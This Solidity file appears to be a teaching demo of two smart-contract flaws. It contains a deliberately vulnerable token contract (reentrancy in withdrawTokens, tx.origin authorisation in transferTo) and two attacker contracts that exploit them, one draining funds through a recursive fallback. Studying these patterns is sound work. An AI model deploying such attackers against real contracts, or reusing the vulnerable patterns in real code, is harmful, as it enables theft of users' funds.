pragma solidity ^0.4.19;

contract VulnerableContract {
    
    address creator;
    uint public outstandingShares = 0;
    mapping(address => uint) public shares;
 
    function VulnerableContract() public {}

    // Simulates ICO type claim of tokens - 1 ETH per share
    function claimTokens() payable public {
        require(shares[msg.sender] == 0);
        require(msg.value == 10 ether);
        shares[msg.sender] = 10;
        outstandingShares += 10;
    }
    
    // Vulnerable to reentrancy
    function withdrawTokens() public returns (uint) {
        if (msg.sender.call.value(shares[msg.sender] * 1000000000000000000)()) {
            outstandingShares -= shares[msg.sender];
            shares[msg.sender] = 0;
        }
    }
    
    // Vulnerable to tx.origin issue
    function transferTo(address _to, uint _amount) public {
        require(shares[tx.origin] >= _amount);
        shares[tx.origin] -= _amount;
        shares[_to] += _amount;
    }
    
    function geMsgtValue() payable public returns (uint) { uint thisValue = msg.value; return thisValue; }
    
    function getBalance() view public returns (uint) { return this.balance; }
}


contract ReentrancyAttacker {
    VulnerableContract victimContract;
    event Received();

    function Attacker(address _victimAddr) public { victimContract = VulnerableContract(_victimAddr); }

    function () payable public { 
        Received();
        victimContract.withdrawTokens();
    }

    function claim() payable public { victimContract.claimTokens.value(msg.value).gas(msg.gas)(); }

    function withdraw() public { victimContract.withdrawTokens(); }

    function changeVictim(address _victimAddr) public { victimContract = VulnerableContract(_victimAddr); }
    

    // Getters
    
    function getBalance() view public returns (uint) { return this.balance; }

    function checkValue() payable public returns (uint) { return victimContract.geMsgtValue.value(msg.value).gas(msg.gas)(); }
    
}

contract TxOriginAttacker {
    
    VulnerableContract victimContract;
    
    function TxOriginAttacker(address _victimAddr) public {
        victimContract = VulnerableContract(_victimAddr);
    }
    
    function doShit() payable public {
        victimContract.transferTo(this, 10);
    }
}
